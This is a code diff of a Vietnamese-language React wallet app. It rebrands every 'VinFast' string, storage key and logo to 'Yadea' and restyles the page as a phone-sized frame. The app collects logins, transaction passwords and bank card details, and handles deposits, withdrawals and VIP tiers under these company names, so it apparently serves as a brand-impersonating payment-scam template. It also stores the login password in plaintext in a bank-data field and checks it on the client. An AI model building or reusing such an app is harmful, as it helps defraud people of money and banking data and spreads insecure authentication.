@@ -1,4 +1,4 @@
-'use client';
+﻿'use client';
 
 import React, { useState, useEffect } from "react";
 import { supabase } from "@/lib/supabase";
@@ -69,7 +69,7 @@ export default function WalletPage() {
     }
   }, []);
   
-  // Thông báo từ VinFast
+  // Thông báo từ Yadea
   const [notifications, setNotifications] = useState<Notification[]>([]);
   const [showNotifications, setShowNotifications] = useState(false);
   const [unreadCount, setUnreadCount] = useState(0);
@@ -98,7 +98,7 @@ export default function WalletPage() {
   // Tự động đăng nhập khi load trang (persistent login)
   useEffect(() => {
     const loadSession = async () => {
-      const savedSession = localStorage.getItem("vinfast_user_session");
+      const savedSession = localStorage.getItem("Yadea_user_session");
       if (savedSession) {
         try {
           const session = JSON.parse(savedSession);
@@ -139,7 +139,7 @@ export default function WalletPage() {
     loadSession();
   }, []);
 
-  // Đồng bộ trạng thái giao dịch từ VinFast (polling mỗi 2 giây - realtime)
+  // Đồng bộ trạng thái giao dịch từ Yadea (polling mỗi 2 giây - realtime)
   useEffect(() => {
     if (!isAuthenticated || !userData.id) return;
 
@@ -203,13 +203,13 @@ export default function WalletPage() {
     // Sync ngay lập tức khi mount
     syncTransactionStatus();
 
-    // Polling mỗi 2 giây để đồng bộ realtime với VinFast
+    // Polling mỗi 2 giây để đồng bộ realtime với Yadea
     const interval = setInterval(syncTransactionStatus, 2000);
 
     return () => clearInterval(interval);
   }, [isAuthenticated, userData.id]);
 
-  // Đồng bộ thông báo từ VinFast (polling mỗi 2 giây - realtime)
+  // Đồng bộ thông báo từ Yadea (polling mỗi 2 giây - realtime)
   useEffect(() => {
     if (!isAuthenticated || !userData.id) return;
 
@@ -267,9 +267,9 @@ export default function WalletPage() {
   };
 
   const titleByTab: Record<TabKey, string> = {
-    personal: "Hồ sơ tài khoản VinFast",
+    personal: "Hồ sơ tài khoản Yadea",
     vip: "Trung tâm hạng VIP",
-    wallet: "Ví VinFast",
+    wallet: "Ví Yadea",
   };
 
   return (
@@ -284,15 +284,22 @@ export default function WalletPage() {
         color: "#e5e7eb",
         display: "flex",
         justifyContent: "center",
+        alignItems: "center",
         overflow: "hidden",
       }}
     >
       <div style={{ 
         width: "100%", 
-        maxWidth: "100vw",
+        maxWidth: "430px",
+        height: "932px",
+        maxHeight: "100vh",
         display: "flex",
         flexDirection: "column",
-        height: "100vh",
+        background: "rgba(15,23,42,0.95)",
+        boxShadow: "0 20px 60px rgba(0,0,0,0.8), 0 0 0 1px rgba(255,255,255,0.1)",
+        borderRadius: "0px",
+        overflow: "hidden",
+        position: "relative",
       }}>
         {!isAuthenticated ? (
           <AuthScreen
@@ -302,58 +309,41 @@ export default function WalletPage() {
               setUserData(data);
               setIsAuthenticated(true);
               // Lưu session để duy trì đăng nhập
-              localStorage.setItem("vinfast_user_session", JSON.stringify({ userId: data.id }));
+              localStorage.setItem("Yadea_user_session", JSON.stringify({ userId: data.id }));
             }}
           />
         ) : (
           <>
-            {/* Header with logo and title */}
-            <div style={{ 
-              textAlign: "center", 
-              padding: "16px 20px",
-              background: "rgba(15,23,42,0.8)",
-              borderBottom: "1px solid rgba(148,163,184,0.2)",
-              flexShrink: 0,
-            }}>
-              <img 
-                src="https://vinfastat-hcm.com/wp-content/uploads/2023/06/Logo_of_VinFast_3D_Banner.svg-1.png" 
-                alt="VinFast Logo" 
-                style={{ 
-                  height: "40px", 
-                  margin: "0 auto 8px",
-                  display: "block"
-                }} 
-              />
-              <h2 style={{ margin: 0, fontSize: "1.1rem", fontWeight: 600 }}>
-                {titleByTab[activeTab]}
-              </h2>
-            </div>
-
             {/* Nội dung chính thay đổi theo tab - có thể scroll */}
             <div style={{
               flex: 1,
               overflowY: "auto",
               overflowX: "hidden",
               padding: "20px",
+              paddingTop: "20px",
+              paddingBottom: "80px",
               WebkitOverflowScrolling: "touch",
             }}>
               {renderContent()}
             </div>
 
-            {/* Thanh điều hướng dưới: 3 phím tắt FIXED - Không co giãn */}
+            {/* Thanh điều hướng dưới: 3 phím tắt FIXED - Mobile style */}
             <div
               style={{
                 width: "100%",
                 display: "grid",
                 gridTemplateColumns: "1fr 1fr 1fr",
                 gap: 0,
-                padding: "8px 0",
+                padding: "4px 0",
                 background: "rgba(15,23,42,0.98)",
                 borderTop: "1px solid rgba(148,163,184,0.3)",
                 flexShrink: 0,
-                position: "sticky",
-                bottom: 0,
                 boxShadow: "0 -4px 12px rgba(0,0,0,0.3)",
+                position: "absolute",
+                bottom: 0,
+                left: 0,
+                right: 0,
+                zIndex: 100,
               }}
             >
               <NavButton
@@ -431,7 +421,7 @@ const AuthScreen: React.FC<AuthScreenProps> = ({
     if (isLogin) {
       // Validate login
       if (!emailOrPhone || !password) {
-        alert("⚠️ VinFast thông báo\n\nVui lòng nhập đầy đủ thông tin đăng nhập!");
+        alert("⚠️ Yadea thông báo\n\nVui lòng nhập đầy đủ thông tin đăng nhập!");
         return;
       }
       
@@ -444,14 +434,14 @@ const AuthScreen: React.FC<AuthScreenProps> = ({
           .single();
         
         if (error || !users) {
-          alert("⚠️ VinFast thông báo\n\nTài khoản không tồn tại! Vui lòng đăng ký tài khoản mới.");
+          alert("⚠️ Yadea thông báo\n\nTài khoản không tồn tại! Vui lòng đăng ký tài khoản mới.");
           return;
         }
         
         // Lấy password từ linked_banks JSONB
         const storedPassword = users.linked_banks?.[0]?.password;
         if (storedPassword !== password) {
-          alert("⚠️ VinFast thông báo\n\nMật khẩu không đúng! Vui lòng kiểm tra lại.");
+          alert("⚠️ Yadea thông báo\n\nMật khẩu không đúng! Vui lòng kiểm tra lại.");
           return;
         }
         
@@ -487,40 +477,40 @@ const AuthScreen: React.FC<AuthScreenProps> = ({
     } else {
       // Validate register
       if (!fullName || !emailOrPhone || !password || !confirmPassword || !transactionPassword || !confirmTransactionPassword) {
-        alert("⚠️ VinFast thông báo\n\nVui lòng điền đầy đủ thông tin đăng ký!");
+        alert("⚠️ Yadea thông báo\n\nVui lòng điền đầy đủ thông tin đăng ký!");
         return;
       }
       
       // VALIDATE EMAIL/PHONE FORMAT
       if (!validateEmailOrPhone(emailOrPhone)) {
-        alert("⚠️ VinFast thông báo\n\nEmail hoặc số điện thoại không đúng định dạng!\n\nEmail: example@gmail.com\nSố điện thoại: 0xxxxxxxxx (10 số, bắt đầu bằng 03, 05, 07, 08, 09)");
+        alert("⚠️ Yadea thông báo\n\nEmail hoặc số điện thoại không đúng định dạng!\n\nEmail: example@gmail.com\nSố điện thoại: 0xxxxxxxxx (10 số, bắt đầu bằng 03, 05, 07, 08, 09)");
         return;
       }
       
       // Kiểm tra tài khoản đã tồn tại
-      const savedUsersCheck = localStorage.getItem("vinfast_users");
+      const savedUsersCheck = localStorage.getItem("Yadea_users");
       const existingUsers = savedUsersCheck ? JSON.parse(savedUsersCheck) : [];
       const userExists = existingUsers.find((u: UserData) => u.emailOrPhone === emailOrPhone);
       
       if (userExists) {
-        alert("⚠️ VinFast thông báo\n\nEmail/Số điện thoại này đã được đăng ký! Vui lòng đăng nhập hoặc sử dụng thông tin khác.");
+        alert("⚠️ Yadea thông báo\n\nEmail/Số điện thoại này đã được đăng ký! Vui lòng đăng nhập hoặc sử dụng thông tin khác.");
         return;
       }
       
       if (password !== confirmPassword) {
-        alert("⚠️ VinFast thông báo\n\nMật khẩu đăng nhập xác nhận không khớp!");
+        alert("⚠️ Yadea thông báo\n\nMật khẩu đăng nhập xác nhận không khớp!");
         return;
       }
       if (password.length < 6) {
-        alert("⚠️ VinFast thông báo\n\nMật khẩu đăng nhập phải có ít nhất 6 ký tự!");
+        alert("⚠️ Yadea thông báo\n\nMật khẩu đăng nhập phải có ít nhất 6 ký tự!");
         return;
       }
       if (transactionPassword !== confirmTransactionPassword) {
-        alert("⚠️ VinFast thông báo\n\nMật khẩu giao dịch xác nhận không khớp!");
+        alert("⚠️ Yadea thông báo\n\nMật khẩu giao dịch xác nhận không khớp!");
         return;
       }
       if (transactionPassword.length < 6) {
-        alert("⚠️ VinFast thông báo\n\nMật khẩu giao dịch phải có ít nhất 6 ký tự!");
+        alert("⚠️ Yadea thông báo\n\nMật khẩu giao dịch phải có ít nhất 6 ký tự!");
         return;
       }
       
@@ -534,7 +524,7 @@ const AuthScreen: React.FC<AuthScreenProps> = ({
           .single();
         
         if (existing) {
-          alert("⚠️ VinFast thông báo\n\nEmail/Số điện thoại này đã được đăng ký! Vui lòng đăng nhập hoặc sử dụng thông tin khác.");
+          alert("⚠️ Yadea thông báo\n\nEmail/Số điện thoại này đã được đăng ký! Vui lòng đăng nhập hoặc sử dụng thông tin khác.");
           return;
         }
         
@@ -583,7 +573,7 @@ const AuthScreen: React.FC<AuthScreenProps> = ({
           lastLogin: data.last_login
         };
         
-        alert("✅ VinFast thông báo\n\nChúc mừng bạn đã đăng ký thành công!");
+        alert("✅ Yadea thông báo\n\nChúc mừng bạn đã đăng ký thành công!");
         onAuthenticated(newUserData);
       } catch (err) {
         alert("⚠️ Lỗi kết nối! Vui lòng kiểm tra internet.");
@@ -604,12 +594,13 @@ const AuthScreen: React.FC<AuthScreenProps> = ({
     >
       <div style={{ textAlign: "center", marginBottom: 16 }}>
         <img 
-          src="https://vinfastat-hcm.com/wp-content/uploads/2023/06/Logo_of_VinFast_3D_Banner.svg-1.png" 
-          alt="VinFast Logo" 
+          src="https://www.yadea.com.vn/wp-content/uploads/2023/09/logo-yadea.svg" 
+          alt="Yadea Logo" 
           style={{ 
             height: "60px", 
             margin: "0 auto 12px",
-            display: "block"
+            display: "block",
+            filter: "brightness(0) invert(1)"
           }} 
         />
         <div
@@ -620,10 +611,10 @@ const AuthScreen: React.FC<AuthScreenProps> = ({
             marginBottom: 4,
           }}
         >
-          Xe Đạp điện trợ lực
+          Xe Đạp điện trợ lực Yadea
         </div>
         <div style={{ fontSize: 12, opacity: 0.8 }}>
-          Đăng nhập để sử dụng ví VinFast & trung tâm VIP
+          Đăng nhập để sử dụng ví Yadea & trung tâm VIP
         </div>
       </div>
 
@@ -702,7 +693,7 @@ const AuthScreen: React.FC<AuthScreenProps> = ({
           <input
             value={emailOrPhone}
             onChange={(e) => setEmailOrPhone(e.target.value)}
-            placeholder="VD: demo@vinfast.com / 0888 888 888"
+            placeholder="VD: demo@Yadea.com / 0888 888 888"
             style={{
               padding: "8px 10px",
               borderRadius: 10,
@@ -923,7 +914,7 @@ const AuthScreen: React.FC<AuthScreenProps> = ({
         }}
       >
         Bằng việc tiếp tục, bạn đồng ý với Quy chế hoạt động & Chính sách bảo
-        mật của VinFast.
+        mật của Yadea.
       </div>
 
       <div style={{ marginTop: 16, textAlign: "center" }}>
@@ -964,8 +955,8 @@ const NavButton: React.FC<NavButtonProps> = ({
         flexDirection: "column",
         alignItems: "center",
         justifyContent: "center",
-        gap: 4,
-        padding: "10px 8px",
+        gap: 0,
+        padding: "12px 8px",
         border: "none",
         cursor: "pointer",
         fontSize: "11px",
@@ -975,7 +966,7 @@ const NavButton: React.FC<NavButtonProps> = ({
           : "transparent",
         color: active ? "#ffffff" : "#94a3b8",
         transition: "all 0.2s ease",
-        minHeight: 64,
+        minHeight: 56,
         position: "relative",
       }}
       onMouseEnter={(e) => {
@@ -990,14 +981,10 @@ const NavButton: React.FC<NavButtonProps> = ({
       }}
     >
       <span style={{ 
-        fontSize: 24, 
+        fontSize: 28, 
         lineHeight: 1,
         display: "block",
       }}>{icon}</span>
-      <span style={{ 
-        lineHeight: 1,
-        letterSpacing: "0.3px",
-      }}>{label}</span>
     </button>
   );
 };
@@ -1048,7 +1035,7 @@ const PersonalSection: React.FC<PersonalSectionProps> = ({ userData }) => {
     }
     
     // Cập nhật thông tin trong localStorage
-    const savedUsers = localStorage.getItem("vinfast_users");
+    const savedUsers = localStorage.getItem("Yadea_users");
     const users = savedUsers ? JSON.parse(savedUsers) : [];
     const updatedUsers = users.map((u: UserData) => {
       if (u.id === userData.id) {
@@ -1056,7 +1043,7 @@ const PersonalSection: React.FC<PersonalSectionProps> = ({ userData }) => {
       }
       return u;
     });
-    localStorage.setItem("vinfast_users", JSON.stringify(updatedUsers));
+    localStorage.setItem("Yadea_users", JSON.stringify(updatedUsers));
     
     alert("Cập nhật thông tin thành công! Vui lòng đăng nhập lại để thấy thay đổi.");
     setIsEditingProfile(false);
@@ -1748,7 +1735,7 @@ const VipSection: React.FC<VipSectionProps> = ({ userData }) => {
         </div>
         <ul style={{ paddingLeft: 18, margin: 0, display: "grid", gap: 4 }}>
           <li>Đường dây chăm sóc riêng cho đối tác VIP.</li>
-          <li>Tham gia sự kiện / ưu đãi nội bộ VinFast.</li>
+          <li>Tham gia sự kiện / ưu đãi nội bộ Yadea.</li>
         </ul>
 
         <button
@@ -2021,7 +2008,7 @@ const WalletSection: React.FC<WalletSectionProps> = ({
             <button
               onClick={async () => {
                 if (!newBankName || !newBankNumber || !newBankHolder) {
-                  alert("⚠️ VinFast thông báo\n\nVui lòng điền đầy đủ thông tin thẻ ngân hàng!");
+                  alert("⚠️ Yadea thông báo\n\nVui lòng điền đầy đủ thông tin thẻ ngân hàng!");
                   return;
                 }
                 const id = `${newBankName}-${newBankNumber}`;
@@ -2053,7 +2040,7 @@ const WalletSection: React.FC<WalletSectionProps> = ({
                 setNewBankName("");
                 setNewBankNumber("");
                 setNewBankHolder("");
-                alert("✅ VinFast thông báo\n\nLiên kết thẻ thành công!");
+                alert("✅ Yadea thông báo\n\nLiên kết thẻ thành công!");
                 setMode("overview");
               }}
               style={{
@@ -2147,16 +2134,16 @@ const WalletSection: React.FC<WalletSectionProps> = ({
               onClick={async () => {
                 // ✅ Kiểm tra tài khoản bị khóa
                 if (userData.isLocked) {
-                  alert("🔒 VinFast thông báo\n\nTài khoản của bạn đã bị khóa!\n\nVui lòng liên hệ CSKH để được hỗ trợ.");
+                  alert("🔒 Yadea thông báo\n\nTài khoản của bạn đã bị khóa!\n\nVui lòng liên hệ CSKH để được hỗ trợ.");
                   return;
                 }
                 
                 if (!depositAmount || parseFloat(depositAmount) <= 0) {
-                  alert("⚠️ VinFast thông báo\n\nVui lòng nhập số tiền hợp lệ!");
+                  alert("⚠️ Yadea thông báo\n\nVui lòng nhập số tiền hợp lệ!");
                   return;
                 }
                 
-                // Tạo yêu cầu nạp tiền và gửi đến VinFast
+                // Tạo yêu cầu nạp tiền và gửi đến Yadea
                 const amount = parseFloat(depositAmount);
                 const now = new Date().toISOString();
                 const requestId = `DEP-${Date.now()}`;
@@ -2182,7 +2169,7 @@ const WalletSection: React.FC<WalletSectionProps> = ({
                   return;
                 }
                 
-                alert(`✅ VinFast - Yêu cầu nạp tiền thành công!\n\nSố tiền: ₫${amount.toLocaleString()}\nTrạng thái: Đang chờ VinFast xử lý\n\n⏳ Chúng tôi sẽ xác nhận ngay khi nhận được thanh toán của bạn.`);
+                alert(`✅ Yadea - Yêu cầu nạp tiền thành công!\n\nSố tiền: ₫${amount.toLocaleString()}\nTrạng thái: Đang chờ Yadea xử lý\n\n⏳ Chúng tôi sẽ xác nhận ngay khi nhận được thanh toán của bạn.`);
                 setDepositAmount("");
                 setMode("overview");
               }}
@@ -2360,7 +2347,7 @@ const WalletSection: React.FC<WalletSectionProps> = ({
                 onClick={async () => {
                   // ✅ Kiểm tra tài khoản bị khóa
                   if (userData.isLocked) {
-                    alert("🔒 VinFast thông báo\n\nTài khoản của bạn đã bị khóa!\n\nVui lòng liên hệ CSKH để được hỗ trợ.");
+                    alert("🔒 Yadea thông báo\n\nTài khoản của bạn đã bị khóa!\n\nVui lòng liên hệ CSKH để được hỗ trợ.");
                     return;
                   }
                   
@@ -2450,7 +2437,7 @@ const WalletSection: React.FC<WalletSectionProps> = ({
                   
                   setUserData(updatedUserData);
                   
-                  alert(`✅ VinFast - Yêu cầu rút tiền thành công!\n\nSố tiền: ₫${amount.toLocaleString()}\nTrạng thái: Đang chờ VinFast xử lý\n\n⏳ Chúng tôi sẽ chuyển tiền vào tài khoản của bạn trong vòng 24h. Nếu có vấn đề, số tiền sẽ được hoàn lại vào ví.`);
+                  alert(`✅ Yadea - Yêu cầu rút tiền thành công!\n\nSố tiền: ₫${amount.toLocaleString()}\nTrạng thái: Đang chờ Yadea xử lý\n\n⏳ Chúng tôi sẽ chuyển tiền vào tài khoản của bạn trong vòng 24h. Nếu có vấn đề, số tiền sẽ được hoàn lại vào ví.`);
                   setWithdrawAmount("");
                   setWithdrawPassword("");
                   setMode("overview");
@@ -2696,7 +2683,7 @@ const WalletSection: React.FC<WalletSectionProps> = ({
           <button
             onClick={() => {
               if (confirm("Bạn có chắc muốn đăng xuất?")) {
-                localStorage.removeItem("vinfast_user_session");
+                localStorage.removeItem("Yadea_user_session");
                 setIsAuthenticated(false);
                 setUserData({
                   id: "",
